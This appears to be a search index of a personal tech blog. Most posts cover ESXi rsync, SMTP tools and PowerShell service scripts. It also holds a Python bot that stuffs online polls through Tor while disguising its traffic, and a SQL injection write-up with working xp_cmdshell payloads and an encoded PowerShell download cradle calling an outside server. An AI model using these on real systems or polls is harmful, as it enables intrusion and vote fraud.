__getVote(self):\n        try:\n            self.__vote_pointer += 1\n            tor = TorClient()\n\n            with tor.get_guard() as guard:\n                adapter = TorHttpAdapter(guard, 3, retries=self.__retries)\n\n                with requests.Session() as s:\n                    s.mount('http://', adapter)\n                    s.mount('https://', adapter)\n\n                    # Make it look like a different browser randomly\n                    #   by changing the user-agent with every request\n                    self._set_useragent()\n\n                    # Set the poll id in the url\n                    self.__url_poll = self.__url_poll.replace(\"{poll_id}\", self.poll_id)\n\n                    # Go to poll main page to get the needed items\n                    #   to submit for the vote\n                    logger.info(\"Getting: %s\" % self.__url_poll)\n                    r = s.get(self.__url_poll, headers=self._headers)\n                    logger.info(\n                            \"First response: %s\" \n                            % r.status_code \n                            + \" \" \n                            + r.url\n                        )\n                    r.raise_for_status()\n\n                    # Get the html from the web page\n                    bs_content = BeaSoup(r.content, \"lxml\")\n\n                    # Get the info from the Vote button json object\n                    button_data = bs_content.find('a', \n                        class_=\"vote-button css-vote-button pds-vote-button\")\n\n                    v_bdata = button_data.attrs.get('data-vote')\n\n                    # Load as json data\n                    bdata = json.loads(v_bdata)\n\n                    # Get hidden form value\n                    v_pz = bs_content.find(attrs={\"name\": \"pz\"})\n\n                    # Inject data into vote URL template\n                    url_vote = self.__url_template  # reset url_vote\n\n                    url_vote = url_vote.replace(\"{item_pid}\", self.poll_id)\n                    url_vote = url_vote.replace(\"{item_opt}\", self.poll_option)\n                    url_vote = url_vote.replace(\"{item_t}\", str(bdata['t']))\n                    url_vote = url_vote.replace(\"{item_token}\", str(bdata['n']))\n                    url_vote = url_vote.replace(\"{item_pz}\", str(v_pz['value']))\n                    url_vote = url_vote.replace(\"{item_r}\", str(bdata['b']))\n                    url_vote = url_vote.replace(\"{item_va}\", str(bdata['at']))\n\n                    # Makes it look slightly more authentic, by waiting \n                    #  before actually submitting the vote after the\n                    #  initial request to the poll.\n                    logger.info(\"Waiting 2 seconds before submitting.\")\n                    time.sleep(2)\n\n                    # Let's vote!\n                    logger.info(\"Submitting vote %i: %s\" \n                                    % (self.__vote_pointer, url_vote))\n                    r = s.get(url_vote, headers=self._headers)\n\n                    # Redirected response, log it\n                    if r.history:\n                        logger.info(\"Request redirected\")\n                        for resp in r.history:\n                            logger.info(\n                                \"Redirected response: %s\" \n                                % resp.status_code \n                                + \" \" \n                                + resp.url\n                            )\n\n                    logger.info(\n                            \"Final destination: %s\" \n                            % r.status_code \n                            + \" \" \n                            + r.url\n                        )\n\n                    r.raise_for_status()\n\n                    if (self.__vote_pointer != self.poll_votes): \n                        # Wait a random number of seconds between 5 &amp; 20\n                        #  before starting again - more realistic\n                        wait_time = random.randint(5, 20)\n                        logger.info(\"Waiting %i seconds.\" % (wait_time))\n                        time.sleep(wait_time)\n\n        # Any issues, log them and get out\n        except Exception as e:\n            logger.error(e)\n            raise\n\n\n    def getVotes(self):\n        getdata = True\n        self.__vote_pointer = 0\n\n        # No sense in doing anything without a poll id \n        #   and an option to vote for\n        if (self.poll_option != \"\" and self.poll_id != \"\"):\n            try:\n                # If set to 0, run continuously\n                if (self.poll_votes == 0):\n                    while getdata:\n                        self.__getVote()\n                else: \n                    for _ in range(self.poll_votes):\n                        self.__getVote()\n\n            except Exception as e:\n                logger.error(e)\n                getdata = False\n        else:\n            logger.info(\"Please set Poll ID &amp; Option.\")\n</code></pre>","tags":["Python","OOP","Programming"]},{"location":"posts/RSyncEsxi/","title":"Rsync In ESXI","text":"<p>Published: 2023-02-24</p> <p>Having Rsync on ESXI can be useful for many rasons. Personally, I like to use it in an SSH session to copy what I call \"base\" images of VMs whenever I need a new one. </p> <p>Generally, I'll build a virtual machine with basic settings and create a template or base image. When I have the machine the way I like it, I'll copy it off to a storage folder on the datastore, usually called \"baseimages\". Whenver I need a new vm based on that \"template\", I'll simply copy it back and register it on the host. </p> <p>Rsync is nice in this scenario because it will give a progress bar and one can also see data write speeds as well. While the web interface could be used to browse the datastore and visually start the copy from there, I prefer to use the command line - I find it a bit more robust. The web gui has a bug in it (at least on 7.0 U3) where it errors out on copy even though it still completes the task.</p> <p>In order to maintain persistance on my server (USB install of ESXI) I added a couple of lines of code to the <code>local.sh</code> file to recreate the sym links on boot.</p>","tags":["esxi"]},{"location":"posts/RSyncEsxi/#installing-rsync","title":"Installing Rsync","text":"<p>Main credit goes here: https://github.com/gmasonPCS/rsync-on-esxi</p> <pre><code># Get the executable provided my gmasonPCS on github\n# Notice the -no-check flag, would not work otherwise on my server\nwget --no-check-certificate -S -O rsync-on-exit https://github.com/gmasonPCS/rsync-on-esxi/releases/download/Release/rsync-on-esxi.zip\n\n# unzip to a folder on the datastore\nunzip rsync-on-exit\n\n# create a symbolic link to the file on the datastore\nln -s /vmfs/volumes/622d4808-61d34746-1916-1866da7f1485/rsync/rsync-static /bin/rsync\n\n# change permissions on the executable\nchmod 755 /bin/rsync\n\n# edit the startup file\nvi /etc/rc.local.d/local.sh\n\n# Insert similar lines lines in the local.sh file to create the link at boot\n# ln -s /vmfs/volumes/622d4808-61d34746-1916-1866da7f1485/rsync/rsync-static /bin/rsync\n# /sbin/auto-backup.sh\n\n# Execute the autobackup script to save changes in the local.sh file\n# Not sure if this is necessariy\n./sbin/auto-backup.sh\n</code></pre>","tags":["esxi"]},{"location":"posts/RSyncEsxi/#sample-command","title":"Sample Command","text":"<pre><code># copy contents of vm into new_vm\nrsync -ah --progress ./baseimages/vm/ ./new_vm\n</code></pre>","tags":["esxi"]},{"location":"posts/SMTPSinks/","title":"SMTP Sinks","text":"<p>Just some links that help with programming SMTP Sinks for IIS.</p> <ol> <li> <p>SMTP Server Technical Articles Microsoft Windows 2000 SMTP Service Events</p> </li> <li> <p>How to write an OnArrival-type SMTP event sink in managed code by using Visual Studio .NET 2003</p> <p>a. KB Archive Link</p> </li> <li> <p>Managed IIS SMTP Sink Wrapper: Message.CopyContentToStream</p> <p>a. WayBackMachine Link</p> </li> <li> <p>C# Catchall Onarrival Event sink</p> </li> <li>ESTMP Keywords and Verbs (commands) Defined</li> <li> <p>How to get the IP of the SMTP client</p> <p>a. WayBackMachine Link</p> </li> <li> <p>Sample Sink</p> <p>a. WayBackMachine Link</p> </li> <li> <p>Creating a custom authentication sink for IIS SMTP or Exchange</p> <p>a. WayBackMachine Link</p> </li> </ol>"},{"location":"posts/SmtpTester/","title":"SmtpTester","text":"<p>Published: 2006-10-30</p> <p> Git Repository</p> <p></p> <p>The idea to create this app came to me while I was trying to troubleshoot my uncle\u2019s program that wouldn't connect to his smtp server. </p> <p>His application was in VB6 and he used it to send out emails from a list of addresses in an Access database. After he switched ISP's he could no longer get it to work since the new provider required him to authenticate before being able to send mail. I didn't know all the inner workings of communicating with an SMTP server, but I was able to figure out that we needed to send the AUTH command and then in some way the username and password. </p> <p>Not having enough time to fix it I went home later that evening and started researching. To make it more interesting I decided to create a little tool that I could use to learn with as well as use later. I decided to use Foxpro to develop the program for two main reasons: </p> <ul> <li>First, I've only been using it for about a year, so I needed the practice. </li> <li>Second, I wanted to develop an application that you wouldn't normally see written in Foxpro. </li> </ul> <p>Most Foxpro apps, at least from what I can tell so far, are data driven applications. Many smaller companies out there tend to use Foxpro because it is relatively inexpensive, yet extremely flexible and super fast, especially when it comes to dealing with data. </p> <p>I also hope that by developing these little tools, I can help make people more aware that Foxpro is out there and can be used for a variety of projects.</p>","tags":["FoxPro","SMTP"]},{"location":"posts/SqlInjectionBehavior/","title":"Sql Injection Through Code Analysis","text":"<p>Published: 2022-09-25</p>","tags":["sqli","appsec"]},{"location":"posts/SqlInjectionBehavior/#stumbleing-on-a-vulnerability","title":"Stumbleing On A Vulnerability","text":"<p>Some time ago on a web assesment, while looking over code, I came to a file that was particularly interesting -- it was packed full with lines of raw SQL statements. It was written in C# and most of the SQL was quoted inside of the <code>string.format</code> function. Unfortunately, user input was being substitued into the SQL statements, so I immediatly thought one thing -- SQL Injection!</p> <p>Before getting too excited, I had to first determine whether any of the code was even being used by the application. Just beacuse the code was there didn't mean it was actually utilized. The application had quite a large codebase and had been around for a while, so it was possible that code wasn't even being used.</p>","tags":["sqli","appsec"]},{"location":"posts/SqlInjectionBehavior/#verifying-execution","title":"Verifying Execution","text":"<p>In order to verify if the code executed I had to start tracing it back. I started with the line of code and worked back up to the function definiton. From there I searched for where that function might be called and so on. I worked my way up the call stack, and not long after, I found myself in the controller. From there I could easily determine the URL endpoint that would need to be called and any parameters that needed to be sent. All that was left was to determine if it was accessbile and used in the application. </p> <p>Note</p> <ul> <li>While the code structure is identical to the original, it has all been rewritten to hide any proprietary information. . </li> </ul>","tags":["sqli","appsec"]},{"location":"posts/SqlInjectionBehavior/#vulnerable-code","title":"Vulnerable Code","text":"<ul> <li>The initial finding -- You can see the raw SQL with the potential injection point.</li> <li>Anything sent in the place of the scKey (DEMO001 from the URL) will get inserted into the query and sent to the database.</li> </ul> <pre><code>public IEnumerable&lt;CompanyImageDto&gt; GetCompanyImage(string scKey, int? coId)\n{\n    IEnumerable&lt;CompanyImageDto&gt; returnable = Query&lt;CompanyImageDto&gt;(string.Format(\n        \"select * from CompanyscKeyImages where scKey = '{0}'\",\n                                                         ^^^\n                                                 ***INSERTION POINT***\n        scKey), new { }, false);\n    if (returnable.IsNull())\n    {\n        returnable = Query&lt;CompanyImageDto&gt;(string.Format(\n            \"select * from CompanyscKeyImages where Companyid = {0}\",\n            coId), new { }, false);\n    }\n\n    return returnable;\n}\n</code></pre>","tags":["sqli","appsec"]},{"location":"posts/SqlInjectionBehavior/#controller","title":"Controller","text":"<ul> <li>One step up from the above code, into the controller, we can see the calling function and the URL parameter being passed down.</li> </ul> <pre><code>[HttpGet]\n[Route(\"GetCompanyImage/{scKey}\")]\npublic dynamic GetCompanyImage([FromUri] string scKey)\n{\n    var coImgList = service.UserService.GetCompanyImage(scKey);\n    return coImgList;\n}\n</code></pre>","tags":["sqli","appsec"]},{"location":"posts/SqlInjectionBehavior/#http-request","title":"HTTP Request","text":"<ul> <li>One more step up and we can see the API endpoint and HTTP request with the paramter (scKey)</li> <li>The 'scKey\" parameter is where we can try to insert our SQL.</li> </ul> <pre><code>GET /api/user/getCompanyImage/DEMO001 HTTP/1.1\n                              ^^^^^^^\n                            ***SCKEY***\n</code></pre>","tags":["sqli","appsec"]},{"location":"posts/SqlInjectionBehavior/#use-in-the-application","title":"Use In The Application","text":"<p>Once the API endpoint and parameter were found, it was time to verify that indeed the application was vulnerable to SQL Injection. In other words:</p> <ul> <li>Is this API endpoint used in the application? </li> <li>Is it accessible?</li> </ul> <p>In the test environment, it was as simple as going directly to the url as shown below.</p> <p>Because this was MS SQL Server on Windows a simple ' OR 1=1--' was sufficient to trigger the code without error and verifying a way into the backed server.</p> <pre><code>GET /api/user/getCompanyImage/'%20OR%201=1--' HTTP/1.1\n                               ^^^^^^^^^^^^^\n                               ***SQL TEST***\n</code></pre>","tags":["sqli","appsec"]},{"location":"posts/SqlInjectionBehavior/#exploiting","title":"Exploiting","text":"<p>After determening that the URL was accessible, it was time to show how it could be used in an attack. In short, this was the Proof of Concept of where this vulnerability could lead.</p> <p>Certainly, injecting and executing SQL directly to the database can have catastrophic consequences by itself. However, for the purposes of this POC, I wanted to go a bit further and show that in additon to data theft, this could potentially lead to further compromise.</p>","tags":["sqli","appsec"]},{"location":"posts/SqlInjectionBehavior/#enableing-remote-code-execution","title":"Enableing Remote Code Execution","text":"<p>We use the SQL Server stored procedure <code>sp_configure</code> to make changes to the settings of the current server. </p> <p>First, we need to allow advanced options to be changed.</p> <p><code>sp_configure</code> to enable <code>show advanced options</code></p> <pre><code>';EXEC%20sp_configure%20'show%20advanced%20options',%201;%20RECONFIGURE;--\n</code></pre> <p>Next, if not enabled, we attempt to enable the feature <code>xp_cmdshell</code> which will allow a command shell to be spawned.</p> <p><code>sp_configure</code> to enable <code>xp_cmdshell</code></p> <pre><code>';EXEC%20sp_configure%20'xp_cmdshell',%201;%20RECONFIGURE;--\n</code></pre>","tags":["sqli","appsec"]},{"location":"posts/SqlInjectionBehavior/#executing-code","title":"Executing Code","text":"<p>Once xp_cmdshell is available, we attempt to get a PowerShell instance and use it to run the command below.  We encoded in Base64 to pass it in the web request.</p> <p>Command: </p> <pre><code>certutil.exe -urlcache -f http://xxx.xxx.xxx.xxx/testing12345\n</code></pre> <p>Full Command w/ encoded:</p> <pre><code>';EXEC%20xp_cmdshell%20%27powershell%20-enc%20SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAyADAALgAyADIAOAAuADIAMwA2AC4AMQAyADMAOgA4ADAAOAAwAC8AYQBiAGMAJwApACkA%27--'\n</code></pre>","tags":["sqli","appsec"]},{"location":"posts/SqlInjectionBehavior/#proof-of-code-execution","title":"Proof of Code Execution","text":"<p>Looking at the logs on the external server (this server would be at the IP address listed in the command), we can see the Certutil command was executed with the connection attempt requesting the 'testing12345' resource.</p> <p></p> <p>This shows that all commands injected were successfull and that we have the ability for remote code execution. At this point we could encode a reverse shell to gain a foothold on the SQL Server and make our way through the network.</p>","tags":["sqli","appsec"]},{"location":"posts/SqlInjectionBehavior/#takeaways","title":"Takeaways","text":"","tags":["sqli","appsec"]},{"location":"posts/SqlInjectionBehavior/#search-your-code","title":"Search Your Code","text":"<p>A simple search in code for \"markers\" of vulnerabilities can lead to some interesting findings. For instance, in C# that could be \"string.format\" or in more generic terms, you could simply search for \"select *\" and then look at how variables are placed into the sql statement. Either way, this is a simple thing all developers can easily implement into their development lifecycle.</p>","tags":["sqli","appsec"]},{"location":"posts/SqlInjectionBehavior/#development-behavior","title":"Development Behavior","text":"<p>It's one thing to find a few instanaces of vulnerable code, but the same \"pattern\" used throughout the app is development \"behavior\". Perhaps it's outdated code, or a lack of security awareness or training that lead to coding practices that introduce vulnerabilities. In some cases, time constraints and project pressures may lead developers to prioritize speed over security, resulting in insecure code patterns.</p> <p>Whatever the reason, vulnerabilities, especially relatively simple ones, should be removed as part of a continuous code assesment built into the development process. Even at a very basic level, a library of vulnerable code patterns could be maintained and each new release scanned against it. This simple, cost effective step, can make an application more secure and allow security testing to focus in harder to automate areas like business logic vulnerabilities.</p>","tags":["sqli","appsec"]},{"location":"posts/UpDownScript/","title":"Monitor & Restart Service","text":"<p>Published: 2024-01-10</p> <p>Two powershell scripts below related to starting and stopping services. Used with a particularly troublesome service that would get stuck from time to time.</p> <ul> <li>SMTP Server should be an internal server</li> <li>Change the other variables as appropritate</li> </ul>","tags":["PowerShell"]},{"location":"posts/UpDownScript/#start-service","title":"Start Service","text":"<ul> <li>Here we attempt to start the service and wait for 30 seconds. If we can't get it started, alert and disable the task (that presumably runs every 5 minutes) to avoide many email notifications.</li> </ul> <pre><code>$service = Get-Service -Name \"ServiceName\"\n\nif ($service.Status -eq [System.ServiceProcess.ServiceControllerStatus]::Stopped) {\n\n    $service.Start()\n\n    $service.WaitForStatus([System.ServiceProcess.ServiceControllerStatus]::Running, [timespan]::FromSeconds(30)) | Out-Null\n\n    if ($service.Status -ne [System.ServiceProcess.ServiceControllerStatus]::Running) {\n\n        $sendMailMessageSplat = @{\n            From = 'pwrshl_prc &lt;pwrshl_prc@domain.com&gt;'\n            To = 'username &lt;username@domain.com&gt;', 'username2 &lt;username2@domain.com&gt;'\n            Subject = 'error starting ServiceName'\n            Body = \"was not able to start the ServiceName service.\"\n            Priority = 'High'\n            SmtpServer = 'x.x.x.x'\n        }\n        Send-MailMessage @sendMailMessageSplat\n\n        Disable-ScheduledTask -TaskName 'TaskName'\n    }\n} \n</code></pre>","tags":["PowerShell"]},{"location":"posts/UpDownScript/#stop-service","title":"Stop Service","text":"<ul> <li>Here the requirement was to attempt a normal shutdown for 1 minute. If not achieved, force a stop. If that errors out - alert. </li> <li>It\u2019s hard to test the state where you\u2019ve requested a stop, but the executable is stuck in \u201cstop pending\u201d.</li> </ul> <pre><code>$service = Get-Service -Name \"ServiceName\"\n\nif ($service.Status -eq [System.ServiceProcess.ServiceControllerStatus]::Running) {\n\n    $service.Stop()\n\n    $service.WaitForStatus([System.ServiceProcess.ServiceControllerStatus]::Stopped, [timespan]::FromMinutes(1)) | Out-Null\n}\n\nif (($service.Status -eq [System.ServiceProcess.ServiceControllerStatus]::Running) -or\n    ($service.Status -eq [System.ServiceProcess.ServiceControllerStatus]::StopPending)) {\n\n    $wmisvc = Get-WmiObject -Class win32_service -Filter \"name = 'ServiceName'\"\n    try {\n        Stop-Process -Id $wmisvc.processid -Force -PassThru -ErrorAction Stop\n    }\n    catch {\n\n        $sendMailMessageSplat = @{\n            From = 'pwrshl_prc &lt;pwrshl_prc@domain.com&gt;'\n            To = 'username &lt;username@domain.com&gt;', 'username2 &lt;username2@domain.com&gt;'\n            Subject = 'error stopping ServiceName'\n            Body = \"was not able to top the ServiceName service.\"\n            Priority = 'High'\n            SmtpServer = 'x.x.x.x'\n        }\n        Send-MailMessage @sendMailMessageSplat\n    }  \n}\n\n&lt;#\nGet-WmiObject -Class win32_service | Where-Object {$_.state -eq 'stop pending'}\nhttps://woshub.com/killing-windows-services-that-hang-on-stopping/\n#&gt;\n</code></pre>","tags":["PowerShell"]},{"location":"posts/UpDownScript/#windows-scheduled-task","title":"Windows Scheduled Task","text":"<ul> <li> <p>Can be run as two tasks:</p> <p></p> <ul> <li>The first is the start service - check every 5 minutes and start it if down</li> <li>The second to stop the service once per day</li> </ul> </li> <li> <p>How to call a powershell script form a Scheduled Task.</p> <p></p> </li> </ul>","tags":["PowerShell"]},{"location":"posts/UtFiles/","title":"UTFiles","text":"<p>Published: 2007-02-19</p> <p> Git Repository</p> <p></p> <p>I've had this app for a while. In fact, this was one of the very first apps I built in Foxpro. I haven't posted it because I wanted to get it cleaned up and add in some of the new things I've learned.</p> <p>It's basically a file sorting utility that takes files from a specified source directory and its subdirectories, and places them in the destination's subdirectories based on the file's extension.</p> <p>It was originally designed to be used with Unreal Tournament. At lanparties it is quicker and easier to start a new match if everyone already has the files locally on their computers instead of having to download them from the game server when entering a new game. This utility makes it easy for everyone to get all the new maps/addons from a \"lanparty\" directory prior to starting the game.</p> <p>The program can also be used for other occasions where files need to be organized in directories based on their  extension. To know more, download the program and give it a try. It has the ability to create a test directory, so you can change the mappings to search for any file type and then place it in one of the test directory's subdirectory.</p>","tags":["FoxPro"]}]}